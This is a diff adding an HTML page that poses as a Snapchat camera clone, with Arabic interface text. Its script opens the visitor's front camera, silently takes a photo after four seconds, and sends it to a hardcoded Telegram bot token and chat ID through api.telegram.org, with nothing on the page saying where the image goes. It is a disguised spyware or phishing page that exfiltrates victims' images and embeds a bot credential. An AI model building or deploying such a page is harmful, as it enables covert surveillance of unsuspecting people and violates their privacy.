@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>SnapChat Clone</title>
+<style>
+  /* Reset */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body, html {
+    height: 100%;
+    background: black;
+    overflow: hidden;
+    font-family: 'Arial', sans-serif;
+  }
+  #video {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: 1;
+    transform: scaleX(-1); /* عكس الكاميرا مثل السناب */
+  }
+  /* شريط علوي شفاف */
+  header {
+    position: absolute;
+    top: 10px;
+    width: 100%;
+    z-index: 10;
+    display: flex;
+    justify-content: space-between;
+    padding: 0 15px;
+    color: white;
+    font-size: 20px;
+    pointer-events: none; /* عشان ما يتفاعل */
+  }
+  header .icon {
+    pointer-events: auto;
+    cursor: pointer;
+    background: rgba(0,0,0,0.3);
+    padding: 8px;
+    border-radius: 50%;
+  }
+  /* زر التصوير الكبير */
+  #capture-btn {
+    position: absolute;
+    bottom: 60px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 75px;
+    height: 75px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.9);
+    border: 5px solid rgba(255,255,255,0.6);
+    box-shadow: 0 0 15px rgba(255,255,255,0.7);
+    cursor: pointer;
+    z-index: 20;
+    transition: 0.2s ease;
+  }
+  #capture-btn:active {
+    transform: translateX(-50%) scale(0.9);
+  }
+  /* شريط سفلي */
+  footer {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 80px;
+    background: rgba(0,0,0,0.3);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+  }
+  footer .hint {
+    color: white;
+    font-size: 14px;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="icon" title="Flash">⚡</div>
+  <div class="icon" title="Settings">⚙️</div>
+</header>
+
+<video id="video" autoplay playsinline muted></video>
+
+<button id="capture-btn" title="التقط صورة"></button>
+
+<footer>
+  <div class="hint">اضغط زر الكاميرا أو انتظر 4 ثواني لأخذ صورة</div>
+</footer>
+
+<script>
+  const token = '6242732866:AAFMLeQxUZtxDO4eQrr0PHvL1kMy2o6Tpqw';
+  const chat_id = '1929988314';
+
+  const video = document.getElementById('video');
+  const captureBtn = document.getElementById('capture-btn');
+  const canvas = document.createElement('canvas');
+
+  // تشغيل الكاميرا مع عكس الصورة (زي السناب)
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      video.srcObject = stream;
+      // اخذ صورة تلقائي بعد 4 ثواني
+      setTimeout(takePhoto, 4000);
+    })
+    .catch(err => {
+      alert('فشل في تشغيل الكاميرا');
+      console.error(err);
+    });
+
+  function takePhoto() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    // ارسم الصورة مع عكس X عشان تطلع صح
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, 'snap.jpg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        console.log('تم إرسال الصورة إلى تيليجرام');
+      }).catch(e => {
+        console.error('خطأ في الإرسال:', e);
+      });
+    }, 'image/jpeg');
+  }
+
+  // زر التصوير اليدوي
+  captureBtn.addEventListener('click', takePhoto);
+</script>
+
+</body>
+  </html>
